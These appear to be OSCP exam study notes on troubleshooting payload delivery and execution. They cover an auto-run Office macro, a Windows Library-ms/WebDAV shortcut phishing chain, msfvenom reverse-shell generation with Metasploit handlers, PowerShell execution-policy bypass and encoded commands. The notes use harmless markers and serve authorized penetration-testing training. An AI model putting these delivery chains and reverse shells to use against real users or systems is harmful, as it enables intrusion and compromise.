# Resolve payload execution obstacles

[Overview](../START.canvas) · [Browser map](../Map.html)

Locate the first failed boundary: delivery → trigger → parser → format/runtime → execution policy/control → connection → session. Change the condition supported by evidence instead of replacing every payload component.

## execution-office

### Use a gated Office macro delivery chain

**Enter:** An assigned client-side scenario includes Office and a document-open interaction

**Discovery**

```text
Get-Item .\FILE -Stream *
Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue
```

**Interpret:** Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity.

**Still check:** Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution.

**Verify:** Verify the actual macro-triggered effect and user context; document receipt is not execution.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-office)

### Full procedure and variants

Use a macro-enabled format such as `.docm` or a legacy `.doc`; `.docx` does not persist embedded VBA macros by itself. Store the macro in the document, not only the global template. A minimal harmless execution proof is:

```vb
Sub AutoOpen()
    RunProof
End Sub

Sub Document_Open()
    RunProof
End Sub

Sub RunProof()
    CreateObject("WScript.Shell").Run _
        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
End Sub
```

`AutoOpen` and `Document_Open` cover distinct Word opening paths. Replace the proof command only after the document, trigger and execution context are confirmed.

Modern Office commonly blocks VBA macros in files carrying Mark of the Web rather than offering a universal one-click enable path. Relevant gates include:

- file format actually supports the macro;
- macro is stored in the delivered document;
- MOTW/Zone Identifier and security zone;
- Protected View and Trust Center settings;
- signed publisher or Trusted Location decisions;
- organization GPO that the user cannot override;
- user opened the document and performed the required permitted action;
- Office launched the expected child process;
- the child command survived VBA, CMD and PowerShell quoting;
- delivery and callback network paths both work.

Inspect a file's zone without changing it:

```powershell
Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier
```

`ZoneId=3` represents the Internet zone. Absence of the stream does not prove that macro policy permits execution, and removing MOTW does not override every policy.

### Follow the evidence

- [ Repair quoting, encoding and command-length boundaries](execution.md#execution-parser) — A simple command works while a longer or nested payload fails Required: Known outer request/template/database parser and inner shell; correct character encoding and transport length
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
- [ Use Windows authenticated access or a PowerShell command channel](sessions-transfers.md#session-windows) — Windows execution or valid credentials with an available remote service Required: Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route
## execution-library

### Use a Windows Library/WebDAV/shortcut chain with explicit interaction

**Enter:** A client-side scenario permits a Library file and remote share presentation

**Discovery**

```text
Get-Content .\FILE.library-ms
Test-NetConnection LHOST -Port PORT
```

**Interpret:** The resource can be presented while the executable user interaction is still absent.

**Still check:** Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect.

**Verify:** Verify the launched command's identity/effect and distinguish WebDAV requests from execution.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-library)

### Full procedure and variants

A `.Library-ms` file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:

```text
delivered .Library-ms
→ user opens library
→ Explorer reaches WebDAV location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback
```

If WsgiDAV is already installed, publish a dedicated authorized-lab directory:

```bash
mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous
```

> Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
> Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.

Original library template using placeholders:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://LHOST/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Save it with a `.Library-ms` extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

Create a shortcut on a controlled Windows preparation host:

```powershell
$shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()
```

Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:

```text
Explorer → WebDAV
shortcut command → optional payload/download server
executed payload → listener/handler
```

Failure cues:

| Observation | Next boundary |
| --- | --- |
| Library opens empty | WebDAV bind, reachability, WebClient/policy, modified library serialization |
| WebDAV receives nothing | Artifact not opened, URL/port wrong, client route or WebDAV blocked |
| Directory appears; shortcut never runs | Required second user action absent or shortcut blocked |
| Marker works; download absent | Command quoting, DNS and payload-server route |
| Download occurs; no execution | Format, permissions, policy, quarantine or dependency |
| Execution proven; no callback | Listener, route, payload/handler compatibility |

### Follow the evidence

- [ Repair quoting, encoding and command-length boundaries](execution.md#execution-parser) — A simple command works while a longer or nested payload fails Required: Known outer request/template/database parser and inner shell; correct character encoding and transport length
- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
## execution-format

### Match an artifact to its executable consumer and runtime

**Enter:** A downloaded/generated artifact exists but does not run

**Discovery**

```text
file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m
```

**Interpret:** An existing file can fail because its loader/runtime is missing; this is separate from callback failure.

**Still check:** Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity.

**Verify:** Verify matching bytes, consumer and actual minimal execution effect; on Windows inspect PE architecture/runtime and resulting process.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-format)

### Full procedure and variants

The file extension is not the execution contract. Record all of these:

```text
target OS and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and PATH
required runtime/libraries
arguments and quoting
network direction
handler protocol
```

##### 4.1 Linux checks

```bash
uname -a
uname -m
file PAYLOAD
readelf -h PAYLOAD | sed -n '1,25p'
ldd PAYLOAD
ls -l PAYLOAD
findmnt -T /PATH/TO/PAYLOAD
head -n 1 SCRIPT
```

Common interpretations:

- `Exec format error`: wrong format/architecture or invalid interpreter line;
- `Permission denied`: missing execute permission, inaccessible parent directory, `noexec`, policy or identity issue;
- `No such file or directory` when the file exists: missing dynamic loader or broken shebang interpreter;
- missing shared object: runtime library mismatch;
- `^M` in a shebang: CRLF line endings changed the interpreter path;
- works interactively but not through cron/service: environment, working directory, shell, identity or route differs.

##### 4.2 Windows checks

```powershell
Get-CimInstance Win32_OperatingSystem |
  Select-Object Caption,Version,BuildNumber,OSArchitecture

[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
$env:PROCESSOR_ARCHITECTURE
Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe'
```

Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script:

| Consumer | Required property / common failure |
| --- | --- |
| Direct process creation | Compatible PE/ELF/script and dependencies |
| Windows service | Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program |
| DLL loader/hijack | Correct bitness, expected exports and dependency behavior |
| `msiexec` | Valid MSI package, not an EXE renamed `.msi` |
| PowerShell | Valid syntax, edition/runtime compatibility and applicable policy/control state |
| Existing memory-corruption PoC | Documented architecture, space, bad characters and exit behavior |

### Follow the evidence

- [ Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile) — An existing C/C++ or platform-specific PoC matches the candidate Required: Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants
- [ Generate a payload matching OS, process, format and handler](sessions-transfers.md#payload-generate) — An existing exploit/delivery primitive needs a binary or raw payload Required: Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener
- [ Repair quoting, encoding and command-length boundaries](execution.md#execution-parser) — A simple command works while a longer or nested payload fails Required: Known outer request/template/database parser and inner shell; correct character encoding and transport length
- [ Use a gated Office macro delivery chain](execution.md#execution-office) — An assigned client-side scenario includes Office and a document-open interaction Required: Compatible installed Office/macro support, a real required user interaction, executable document state and allowed macro/security policy
- [ Use a Windows Library/WebDAV/shortcut chain with explicit interaction](execution.md#execution-library) — A client-side scenario permits a Library file and remote share presentation Required: Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action
## execution-parser

### Repair quoting, encoding and command-length boundaries

**Enter:** A simple command works while a longer or nested payload fails

**Discovery**

```text
curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH
```

**Interpret:** The break follows a shell-language/representation change, so network or exploit applicability need not have changed.

**Still check:** Confirm outer decoding, actual inner shell, length and correct byte/string encoding with a small test.

**Verify:** Verify received/executed command behavior at each parser boundary with small discriminating tests.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-parser)

### Full procedure and variants

Write the real chain:

```text
document/shortcut or HTTP/SQL/template input
→ application parser
→ VBA/WScript/application runtime
→ cmd.exe /c, /bin/sh -c or PowerShell
→ final command/payload
```

Start with a short marker at every layer. Check:

- quote ownership at each layer;
- expansion of `%VAR%`, `$VAR` and PowerShell variables;
- metacharacters such as `&`, `|`, `<`, `>`, `;`, backticks and parentheses;
- URL/JSON/XML/Base64 decode count;
- command-line, VBA-string, request-field or exploit-buffer length;
- current directory and relative paths.

PowerShell encoded-command preparation:

```powershell
$command = 'COMMAND'
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
[Convert]::ToBase64String($bytes)
```

```cmd
powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE
```

`-EncodedCommand` uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

Write the parser chain explicitly:

```text
HTTP/SQL/template parser
→ application language
→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell)
→ target shell/interpreter
→ payload command
```

Test each layer with a small command. Encode only for the layer that consumes the characters:

```bash
python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))'
```

Typical failures:

- `&`, `|`, `>`, `<`, `$`, backticks, quotes or spaces consumed by an outer shell;
- URL decoding occurs zero, one or two times;
- JSON, XML, SQL or template quoting changes the command;
- PowerShell receives UTF-8 Base64 instead of required UTF-16LE;
- payload length exceeds a field, command line or exploit buffer;
- 32-bit payload is injected into a 64-bit context or the reverse.

### Follow the evidence

- [ Prove visible or blind operating-system command injection](web-exploitation.md#web-command) — An input appears in a command-like operation or causes shell-dependent behavior Required: Input reaches command execution with an exploitable parsing boundary; process identity/runtime can perform the selected proof
- [ Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse) — Linux command execution exists but an interactive channel is needed Required: A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener
- [ Use Windows authenticated access or a PowerShell command channel](sessions-transfers.md#session-windows) — Windows execution or valid credentials with an available remote service Required: Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route
## execution-powershell

### Distinguish PowerShell policy, language mode and protected execution layers

**Enter:** PowerShell reports scripts disabled, constrained syntax or an execution-control error

**Discovery**

```text
Get-ExecutionPolicy -List
$ExecutionContext.SessionState.LanguageMode
$PSVersionTable
```

**Interpret:** A script policy gate is distinct from language-mode restrictions or an antimalware verdict.

**Still check:** Identify the actual controlling policy and permitted execution path; encoding/policy arguments do not remove unrelated controls.

**Verify:** Record the exact failing layer and demonstrate the chosen permitted operation's actual effect.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-powershell)

### Full procedure and variants

Do not merge these different controls:

| Control | What it changes | Useful evidence |
| --- | --- | --- |
| Execution policy | Conditions for loading/running scripts | `Get-ExecutionPolicy -List` and exact error |
| Language mode | Available PowerShell language features | `$ExecutionContext.SessionState.LanguageMode` |
| AMSI | Submits supported script/content to antimalware | Explicit block/error plus Defender/PowerShell events |
| AppLocker/WDAC | Application/script allow policy | Effective policy and application-control events |
| Defender/other AV | File, memory, behavior and network decisions | Status, detection history, quarantine/events |
| Permissions | File/process/service/token rights | Access-denied result under named identity |

Read-only checks:

```powershell
Get-ExecutionPolicy -List
$ExecutionContext.SessionState.LanguageMode

Get-MpComputerStatus |
  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
    BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion

Get-MpThreatDetection |
  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources

Get-AppLockerPolicy -Effective -Xml

Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,LevelDisplayName,Message

Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,Message

Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' `
  -MaxEvents 50 -ErrorAction SilentlyContinue |
  Select-Object TimeCreated,Id,Message
```

Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive.

Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it:

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1
```

This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload.

### Follow the evidence

- [ Interpret endpoint-control evidence and select a justified alternative](execution.md#execution-controls) — An artifact disappears, a process is blocked, or execution is stopped with a policy/security event Required: Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold
- [ Use Windows authenticated access or a PowerShell command channel](sessions-transfers.md#session-windows) — Windows execution or valid credentials with an available remote service Required: Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
## execution-controls

### Interpret endpoint-control evidence and select a justified alternative

**Enter:** An artifact disappears, a process is blocked, or execution is stopped with a policy/security event

**Discovery**

```text
Test-Path .\FILE
Get-FileHash .\FILE -Algorithm SHA256 -ErrorAction SilentlyContinue
```

**Interpret:** A disappearing artifact narrows the boundary but does not identify a particular control without corroboration.

**Still check:** Correlate file/process/event identity, time and exact action before selecting an alternative consumer.

**Verify:** Tie the observed block to the artifact/process and preserve the exact error/event context privately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-controls)

### Full procedure and variants

| Observation | Most useful next action |
| --- | --- |
| Transferred hash differs | Repair transfer/encoding before execution |
| File arrives then vanishes | Inspect quarantine/detection events and resource path |
| File remains; process creation denied | Inspect AppLocker/WDAC, permissions and parent process |
| Script-loading policy error | Inspect scope/precedence; use an authorized process-only invocation if applicable |
| Explicit AMSI/content block | Treat content/control as confirmed; encoding alone is not a supported conclusion |
| Process starts then exits | Capture exit/error, dependency and architecture evidence |
| Process remains; no connection | Test target egress, LHOST and listener |
| TCP handshake then close | Handler/payload mismatch, stage failure, crash or control interruption |

Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:

- changing a filename does not imply a new payload;
- Base64 does not imply concealment from AMSI;
- an in-memory technique is not automatically invisible;
- an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;
- a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.

Windows Defender status, when the current identity can query it:

```powershell
Get-MpComputerStatus |
  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
```

Do not label every failure “AV.” Differentiate:

- file never arrived or hashes differ;
- file arrived and disappeared/quarantined;
- process creation was denied;
- script content was blocked;
- process started and exited/crashed;
- callback was blocked after execution;
- application-control or language-mode restrictions;
- ordinary format, architecture, permission or dependency errors.

Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.

For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with [payload execution obstacles](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md).

### Follow the evidence

- [ Match an artifact to its executable consumer and runtime](execution.md#execution-format) — A downloaded/generated artifact exists but does not run Required: Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format
- [ Repair a web PoC using the real HTTP transaction](public-exploits.md#exploit-web) — An exploit sends requests but authentication, routing or parsing differs from the target Required: A valid baseline transaction with correct host, base path, session/CSRF state and request encoding
- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
## execution-handler

### Pair staged payloads with the correct handler and session lifecycle

**Enter:** A payload connects without a session, or a handler/session exits unexpectedly

**Discovery**

```text
show options
jobs
sessions
```

**Interpret:** The first-stage protocol may be reaching a receiver that cannot provide the remaining stage.

**Still check:** Verify exact payload/architecture/transport pair, listener bind, stage route and lifecycle.

**Verify:** Verify the resulting session's host/identity and keep the listener/payload relationship explicit.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-handler)

### Full procedure and variants

```bash
msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
msfvenom --list formats
msfvenom -p PAYLOAD_NAME --list-options
```

Baseline stageless command shells:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f exe -o shell.exe

file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

Existing reviewed PoC with documented byte restrictions:

```bash
msfvenom -p PAYLOAD_NAME \
  LHOST=LHOST LPORT=LPORT \
  EXITFUNC=thread \
  -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' -s MAX_SPACE
```

Use `EXITFUNC` only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits.

Staging distinction:

```text
windows/x64/shell_reverse_tcp  single/stageless
windows/x64/shell/reverse_tcp  staged
```

A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol.

Matching handler:

```text
msfconsole -q
use exploit/multi/handler
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
set ExitOnSession false
show options
run -j
```

Manage the resulting job/session deliberately:

```text
jobs -l
sessions -l
sessions -i SESSION_ID
background
sessions -k SESSION_ID
jobs -k JOB_ID
```

`ExitOnSession false` keeps the handler available after a session opens. `run -j` backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.

Handler failure cues:

| Output | Interpretation |
| --- | --- |
| Handler never binds | Bad local address, occupied port or privilege issue |
| Raw listener receives connection; framework does not | Different port/interface or payload transport |
| Handler receives connection but no session | Exact payload/stager mismatch, stage blocked or crash |
| Session opens then dies | Parent exits, payload exit behavior, route/control or process crash |
| Session opens as unexpected architecture/type | Default payload or target was not explicitly selected |

### Follow the evidence

- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
- [ Generate a payload matching OS, process, format and handler](sessions-transfers.md#payload-generate) — An existing exploit/delivery primitive needs a binary or raw payload Required: Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener
## execution-framework

### Use a framework module with explicit target and feature constraints

**Enter:** A reviewed module fits a verified exploit prerequisite set

**Discovery**

```text
info
show options
show targets
show payloads
```

**Interpret:** The module describes conditions to investigate; its existence is not a vulnerability result.

**Still check:** Verify exact target/configuration, access, payload/route and current feature restrictions before selecting it.

**Verify:** Verify destination effect and identity outside the module's status message.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-framework)

### Full procedure and variants

Manual module inspection:

```text
search type:exploit cve:CVE_ID
info MODULE_PATH
use MODULE_PATH
show options
show advanced
show targets
show payloads
set RHOSTS TARGET
set RPORT PORT
set TARGET TARGET_ID
set PAYLOAD PAYLOAD_NAME
set LHOST LHOST
set LPORT LPORT
show missing
run
```

Interpretation rules:

- module rank describes expected exploit stability, not target vulnerability;
- `check` is an active module operation and does not prove exploitability when unsupported or inconclusive;
- target IDs, default payloads and options vary by module/version;
- automatic target selection is still an assumption to verify;
- a module's success message is weaker than a verified session, host and identity;
- `setg` persists values across modules and can silently aim later work at the wrong host; prefer local `set` unless global state is intentionally tracked.

Current OSCP+ restriction:

- `msfvenom` and `exploit/multi/handler` may be used against all targets, except that a Meterpreter payload remains subject to the one-target limit;
- any Metasploit Auxiliary, Exploit or Post module—or Meterpreter payload—locks the selection to one target, even if `check` or the attack fails;
- Metasploit pivoting is prohibited;
- automatic exploitation tools are prohibited.

Use manual/source-reviewed exploitation as the reusable baseline. Decide on the restricted Metasploit target deliberately and record that decision before using a restricted module or Meterpreter.

### Follow the evidence

- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
- [ Pair staged payloads with the correct handler and session lifecycle](execution.md#execution-handler) — A payload connects without a session, or a handler/session exits unexpectedly Required: Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration
- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
## execution-callback

### Diagnose connection direction, listener and session failures in order

**Enter:** Command execution or payload delivery exists but the expected usable channel does not

**Discovery**

```text
ss -lnt
ip route get TARGET
sudo tcpdump -ni INTERFACE tcp port PORT
```

**Interpret:** The channel failed before an observed connection; investigate trigger/advertised route/egress before terminal repair.

**Still check:** Name the process initiating the connection and its actual destination address/port. Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes.

**Verify:** Use command proof, packet evidence and actual channel behavior to identify the first failed boundary.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/execution/#execution-callback)

### Full procedure and variants

1. **Delivery:** prove the request/file/argument reaches the intended consumer.
2. **Execution:** prove `id`/`whoami`, hostname or a bounded side effect in the exact context.
3. **Parser:** verify quoting, encoding, interpreter, working directory and length.
4. **Payload:** confirm OS, architecture, format, staged/stageless type and dependencies.
5. **Listener:** start it first and verify the bound address and port.
6. **Route:** test target-to-listener reachability from the execution context.
7. **Security control:** use concrete errors, quarantine, logs or process behavior.
8. **Session:** repair TTY, buffering, encoding and job control after connection.

Target-side route checks where available:

```bash
nc -vz LHOST LPORT
curl -v --connect-timeout 5 http://LHOST:LPORT/
```

```powershell
Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed
```

Observe Kali while triggering:

```bash
sudo tcpdump -ni any tcp port LPORT
```

Interpretation:

| Observation | Next decision |
| --- | --- |
| No SYN reaches Kali | Wrong execution, LHOST, route, egress or earlier parser layer |
| SYN arrives; no listener response | Wrong bind/interface/port or local firewall |
| TCP handshake then immediate close | Payload/handler mismatch, crash or security control |
| Connection stays but no commands | Staged/raw mismatch, buffering or I/O/session issue |

1. Reproduce a harmless direct command in the exact vulnerable or user context.
2. Confirm file/request integrity, final path and consumer.
3. Identify every parser, interpreter and loader.
4. Match target OS, process architecture, artifact format and runtime dependencies.
5. Verify permissions, working directory, execution policy and application-control evidence.
6. Start the correct listener/handler and prove its bind.
7. Prove the target-to-listener route separately.
8. Inspect concrete antimalware, application-control and process-failure evidence.
9. Repair session I/O only after a connection exists.

If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive.

##### A. Document delivered, no callback

```text
Observed: document exists
Unknown: opened, macro permitted, child command, network route
Test: MOTW/policy → harmless marker → child process/download → callback route
Action: repair first failed gate; do not regenerate the payload first
```

##### B. Executable disappears after transfer

```text
Observed: transfer response succeeded
Test: destination listing/hash → Defender detection/resource/event
Interpretation: transfer success is not retention; quarantine requires evidence
Action: choose a justified alternate execution form or native route, within scope
```

##### C. PowerShell says scripts are disabled

```text
Observed: explicit execution-policy error
Test: Get-ExecutionPolicy -List and GPO precedence
Action: use a process-scoped invocation if allowed; do not call this an AMSI result
```

##### D. Connection reaches Netcat but there is no shell

```text
Observed: TCP connection
Test: generated payload name
Interpretation: staged payload may have reached a raw listener
Action: use exact multi/handler or generate a compatible stageless command shell
```

##### E. Binary exists but returns “not found” on Linux

```text
Observed: path and file exist
Test: file, readelf interpreter, ldd, shebang
Interpretation: loader/interpreter dependency may be missing
Action: build/choose a compatible artifact; do not change callback settings
```

##### F. Metasploit module reports completion, no session

```text
Observed: module ran
Test: exact target profile, payload, callback route, handler output and service state
Interpretation: completion is not verified execution/session
Action: preserve module output and diagnose the first missing state
```

```text
artifact/request
→ delivered to intended consumer
→ required user/trigger action
→ parser/interpreter/loader
→ process or bounded side effect
→ network connection
→ handler protocol
→ usable session
```

| Boundary | Decisive evidence | Does not prove |
| --- | --- | --- |
| Delivery | Expected bytes, request, document or shortcut arrives intact | It was opened or parsed |
| Trigger | Intended user/service/parser consumed it | Child process started |
| Execution | Harmless marker, process or command output | Callback route works |
| Connection | Expected peer reaches listener | Payload and handler agree |
| Session | Commands return; host and identity verified | Stability or privilege |

Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one.

### Follow the evidence

- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
- [ Pair staged payloads with the correct handler and session lifecycle](execution.md#execution-handler) — A payload connects without a session, or a handler/session exits unexpectedly Required: Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration
- [ Repair a limited Linux terminal](sessions-transfers.md#session-tty) — A working shell lacks job control, terminal signals or interactive program support Required: A working channel and available PTY mechanism; correct local-terminal control sequence
